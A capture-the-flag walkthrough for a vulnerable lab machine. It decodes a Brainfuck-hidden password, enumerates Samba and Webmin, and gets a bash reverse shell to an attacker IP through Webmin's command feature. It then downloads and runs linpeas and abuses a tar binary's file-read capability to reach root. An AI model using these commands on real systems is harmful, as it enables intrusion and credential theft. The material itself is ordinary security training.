1. `sudo netdiscover -i eth0`
   ![image](https://hackmd.io/_uploads/HJmz99gwlg.png)
2. `curl http://192.168.163.131`
   > ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>--------[...]
   >
   >
   - The source code at the end contains a string that looks like Brainfuck-encrypted text.
3. Use an [online decoder](https://www.dcode.fr/brainfuck-language).
   ![image](https://hackmd.io/_uploads/HJm_Gilveg.png)
   - `.2uqPEfj3D<P'a-3`
4. `nmap -sV 192.168.163.131`
   ![image](https://hackmd.io/_uploads/SJhQ9qxPee.png)
   - `139/tcp & 445/tcp`: Samba service
   - `10000/tcp & 20000/tcp`: Webmin service, a web-based system administration tool
5. `enum4linux -a 192.168.163.131`
   ![image](https://hackmd.io/_uploads/H1fJBjxvxe.png)
   - This shows a user named `cyber` exists.
6. `https://192.168.163.131:20000`
   ![image](https://hackmd.io/_uploads/B1EJv2xDex.png)
   - Username: `cyber`
   - Password: `.2uqPEfj3D<P'a-3`
7. Log in.
   ![image](https://hackmd.io/_uploads/BJefr2sevlg.png)
8. Locate the command execution feature.
   ![image](https://hackmd.io/_uploads/B1rra3lDlg.png)
   `nc -lvnp 4444` on the attacker side to listen
   `bash -c 'bash -i >& /dev/tcp/192.168.163.128/4444 0>&1'` in the command shell and execute it.
9. Reverse shell.
   ![image](https://hackmd.io/_uploads/Hk-Z03ewxg.png)
   - Obtain the first flag
   - `3mp!r3{You_Manage_To_Break_To_My_Secure_Access}`
10. `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 && chmod +x linpeas_linux_amd64 && ./linpeas_linux_amd64`
    - Run `linpeas` to scan the system.
11. Find two privilege escalation clues.
    ![image](https://hackmd.io/_uploads/SyLfSalPle.png)
    - In `/home/cyber/`, there is a `tar` executable with the `cap_dac_read_search` capability set. This allows the specific `tar` program to bypass file permission checks and read any file on the system.
    ![image](https://hackmd.io/_uploads/B1ggB6ePlx.png)
    - In `/var/backups/`, there is a hidden file named `.old_pass.bak` that is readable only by root. The filename suggests it may contain an old password.
12. `cd /home/cyber`
13. `./tar -cf - /var/backups/.old_pass.bak`
    ![image](https://hackmd.io/_uploads/SJz_hplPgl.png)
    - `./tar`: execute the privileged `tar` binary in your home directory
    - `-c`: create an archive
    - `-f -`: send the archive to stdout instead of a file
    - `/var/backups/.old_pass.bak`: the target file to read
    - This reveals the password: `Ts&4&YurgtRX(=~h `
14. `su root`
    ![image](https://hackmd.io/_uploads/H1Zga6eDel.png)
15. `cat rOOt.txt`
    ![image](https://hackmd.io/_uploads/Hylzp6xwxe.png)
    - Gain the final flag!
    - `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}`
